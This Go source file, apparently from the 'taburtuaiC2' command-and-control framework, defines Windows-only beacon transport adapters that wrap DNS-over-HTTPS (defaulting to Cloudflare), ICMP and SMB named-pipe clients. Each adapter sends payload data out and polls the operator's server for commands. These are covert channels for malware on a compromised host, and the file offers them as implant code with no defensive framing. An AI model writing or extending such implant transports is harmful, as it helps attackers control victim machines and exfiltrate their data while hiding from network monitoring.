//go:build windows

package main

import (
	"fmt"

	"github.com/mjopsec/taburtuaiC2/pkg/transport"
)

// dohAdapter wraps transport.DoHClient to satisfy BeaconTransport.
type dohAdapter struct{ c *transport.DoHClient }

func (d *dohAdapter) SendData(payload []byte) error          { return d.c.SendData(payload) }
func (d *dohAdapter) PollCommand() ([]byte, error)           { return d.c.PollCommand() }

func newDoHTransport(domain, agentID, provider string) BeaconTransport {
	p := transport.DoHProvider(provider)
	if p == "" {
		p = transport.DoHCloudflare
	}
	return &dohAdapter{c: transport.NewDoHClient(domain, agentID, p)}
}

// icmpAdapter wraps transport.ICMPClient.
type icmpAdapter struct{ c *transport.ICMPClient }

func (i *icmpAdapter) SendData(payload []byte) error { return i.c.SendData(payload) }
func (i *icmpAdapter) PollCommand() ([]byte, error)  { return i.c.PollCommand() }

func newICMPTransport(serverIP, agentID string) (BeaconTransport, error) {
	c, err := transport.NewICMPClient(serverIP, agentID)
	if err != nil {
		return nil, fmt.Errorf("ICMP transport: %w", err)
	}
	return &icmpAdapter{c: c}, nil
}

// smbAdapter wraps transport.SMBClient.
type smbAdapter struct{ c *transport.SMBClient }

func (s *smbAdapter) SendData(payload []byte) error { return s.c.SendData(payload) }
func (s *smbAdapter) PollCommand() ([]byte, error)  { return s.c.PollCommand() }

func newSMBTransport(relay, pipe, agentID string) (BeaconTransport, error) {
	c, err := transport.NewSMBClient(relay, pipe, agentID)
	if err != nil {
		return nil, fmt.Errorf("SMB transport: %w", err)
	}
	return &smbAdapter{c: c}, nil
}
